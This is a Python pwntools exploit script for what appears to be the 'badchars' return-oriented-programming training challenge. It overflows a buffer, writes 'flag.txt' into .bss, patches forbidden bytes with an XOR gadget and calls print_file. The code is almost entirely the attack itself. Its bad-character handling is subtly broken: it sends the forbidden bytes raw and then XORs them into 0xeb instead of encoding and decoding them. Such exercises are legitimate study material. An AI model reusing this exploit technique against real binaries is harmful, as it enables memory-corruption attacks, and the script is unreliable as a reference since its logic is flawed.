from pwn import *

exe = ELF("./badchars", checksec=True)

context.binary = exe

gdbscript = """
set follow-fork-mode child
b *pwnme+268
"""

args.DEBUG = True

def conn():
    if args.DEBUG:
        return gdb.debug(exe.path, gdbscript=gdbscript)

    return process(exe.path)

FLAG = b"flag.txt"

XOR = 0x400628
ADD = 0x40062C
SUB = 0x400630
MOV = 0x400634

BADCHARS = [ord(i) for i in "xga."]

def get_ropchain():
    rop = ROP(exe)

    rop(r13 = exe.bss(), r12 = FLAG)
    rop.raw(MOV)

    for i, ch in enumerate(FLAG):      
        if ch in BADCHARS:
            rop(r15 = exe.bss() + i, r14 = 0xeb ^ ch)
            rop.raw(XOR)

    rop.call(exe.symbols.print_file, [exe.bss()])    
    return rop.chain()

def main():
    chain = get_ropchain()

    r  = conn()
    r.sendline(b"a" * 0x28 + chain)
    r.interactive()

if __name__ == "__main__":
    main()
